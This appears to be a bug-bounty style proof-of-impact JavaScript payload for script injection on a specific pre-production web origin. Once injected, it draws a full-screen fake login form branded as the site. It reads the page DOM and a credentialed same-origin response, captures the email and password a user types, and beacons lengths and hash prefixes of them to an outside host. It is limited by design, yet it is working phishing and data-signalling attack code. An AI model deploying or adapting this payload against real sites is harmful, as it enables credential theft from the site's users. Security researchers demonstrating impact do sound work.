(() => {
  "use strict";

  if (location.origin !== "https://exchange.pre.verily.com") return;
  if (window.__exchangeImpactProof) return;

  const marker = "amber-field-64a9";
  const result = {
    marker,
    origin: location.origin,
    title: document.title,
    cookieLength: document.cookie.length,
    localStorageEntries: localStorage.length,
    sessionStorageEntries: sessionStorage.length,
    linkCount: document.links.length,
    domLength: 0,
    domHashPrefix: "pending",
    sameOriginStatus: 0,
    sameOriginLength: 0,
    sameOriginHashPrefix: "pending",
    interactionCaptured: false,
  };
  window.__exchangeImpactProof = result;

  const digestPrefix = async (value) => {
    const digest = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(value),
    );
    return [...new Uint8Array(digest)]
      .map((part) => part.toString(16).padStart(2, "0"))
      .join("")
      .slice(0, 12);
  };

  const signal = (event, fields = {}) => {
    const query = new URLSearchParams({
      marker,
      event,
      origin: result.origin,
      cookieLength: String(document.cookie.length),
      localStorageEntries: String(localStorage.length),
      sessionStorageEntries: String(sessionStorage.length),
      linkCount: String(document.links.length),
      domLength: String(result.domLength),
      domHashPrefix: result.domHashPrefix,
      sameOriginStatus: String(result.sameOriginStatus),
      sameOriginLength: String(result.sameOriginLength),
      sameOriginHashPrefix: result.sameOriginHashPrefix,
      ...fields,
    });
    fetch(`https://img.defyourtype.com/r/amber-field-64a9.gif?${query}`, {
      mode: "no-cors",
      credentials: "omit",
      keepalive: true,
    }).catch(() => {});
  };

  const overlay = document.createElement("section");
  overlay.id = marker;
  overlay.innerHTML = `
    <main style="max-width:720px;margin:0 auto;padding:64px 28px;font-family:Arial,sans-serif;color:#102a43">
      <div style="font-size:14px;font-weight:700;letter-spacing:.12em;color:#087f5b">VERILY PRE EXCHANGE</div>
      <h1 style="font-size:42px;line-height:1.1;margin:20px 0 12px">Session confirmation required</h1>
      <p style="font-size:19px;line-height:1.55;margin:0 0 30px">Continue to the Exchange catalog using your account details.</p>
      <form id="amber-field-form" style="display:grid;gap:16px;background:#fff;border:1px solid #cbd5e1;border-radius:16px;padding:28px;box-shadow:0 18px 50px rgba(15,23,42,.16)">
        <label style="display:grid;gap:7px;font-weight:700">Account email
          <input id="amber-field-email" type="email" autocomplete="username" required style="font:16px Arial;padding:13px;border:1px solid #94a3b8;border-radius:8px">
        </label>
        <label style="display:grid;gap:7px;font-weight:700">Access phrase
          <input id="amber-field-secret" type="password" autocomplete="current-password" required style="font:16px Arial;padding:13px;border:1px solid #94a3b8;border-radius:8px">
        </label>
        <button type="submit" style="font:700 17px Arial;padding:14px;border:0;border-radius:8px;background:#087f5b;color:#fff;cursor:pointer">Continue</button>
        <output id="amber-field-result" style="display:none;padding:13px;border-radius:8px;background:#ecfdf5;color:#065f46;font-weight:700"></output>
      </form>
      <pre id="amber-field-proof" style="margin-top:24px;padding:18px;border-radius:12px;background:#102a43;color:#e6fffa;white-space:pre-wrap;font:14px/1.55 monospace"></pre>
    </main>`;
  Object.assign(overlay.style, {
    position: "fixed",
    inset: "0",
    zIndex: "2147483647",
    overflow: "auto",
    background: "linear-gradient(135deg,#effcf6,#e6f6ff)",
  });
  document.body.appendChild(overlay);

  const proof = overlay.querySelector("#amber-field-proof");
  const draw = () => {
    proof.textContent = [
      "EXTERNAL JAVASCRIPT CONTROLS THIS TRUSTED-ORIGIN PAGE",
      `Origin: ${result.origin}`,
      `DOM bytes read: ${result.domLength}`,
      `DOM hash prefix: ${result.domHashPrefix}`,
      `Readable cookie bytes: ${document.cookie.length}`,
      `Local-storage entries: ${localStorage.length}`,
      `Session-storage entries: ${sessionStorage.length}`,
      `Same-origin response: ${result.sameOriginStatus || "pending"}`,
      `Same-origin bytes read: ${result.sameOriginLength}`,
      `Same-origin hash prefix: ${result.sameOriginHashPrefix}`,
      `Synthetic interaction captured: ${result.interactionCaptured}`,
    ].join("\n");
  };

  const readPage = async () => {
    const dom = document.documentElement.outerHTML;
    result.domLength = dom.length;
    result.domHashPrefix = await digestPrefix(dom);

    try {
      const response = await fetch("/", { credentials: "include" });
      const body = await response.text();
      result.sameOriginStatus = response.status;
      result.sameOriginLength = body.length;
      result.sameOriginHashPrefix = await digestPrefix(body);
    } catch (error) {
      result.sameOriginStatus = -1;
      result.sameOriginHashPrefix = error?.name || "Error";
    }

    result.cookieLength = document.cookie.length;
    result.localStorageEntries = localStorage.length;
    result.sessionStorageEntries = sessionStorage.length;
    draw();
    signal("loaded");
  };

  overlay.querySelector("#amber-field-form").addEventListener("submit", async (event) => {
    event.preventDefault();
    const email = overlay.querySelector("#amber-field-email").value;
    const secret = overlay.querySelector("#amber-field-secret").value;
    const emailHashPrefix = await digestPrefix(email);
    const secretHashPrefix = await digestPrefix(secret);
    result.interactionCaptured = true;
    result.emailLength = email.length;
    result.emailHashPrefix = emailHashPrefix;
    result.secretLength = secret.length;
    result.secretHashPrefix = secretHashPrefix;
    draw();

    const output = overlay.querySelector("#amber-field-result");
    output.style.display = "block";
    output.textContent =
      "The synthetic values were intercepted by external JavaScript and signaled off-origin as lengths and hash prefixes.";

    signal("interaction", {
      emailLength: String(email.length),
      emailHashPrefix,
      secretLength: String(secret.length),
      secretHashPrefix,
    });
  });

  draw();
  readPage();
})();
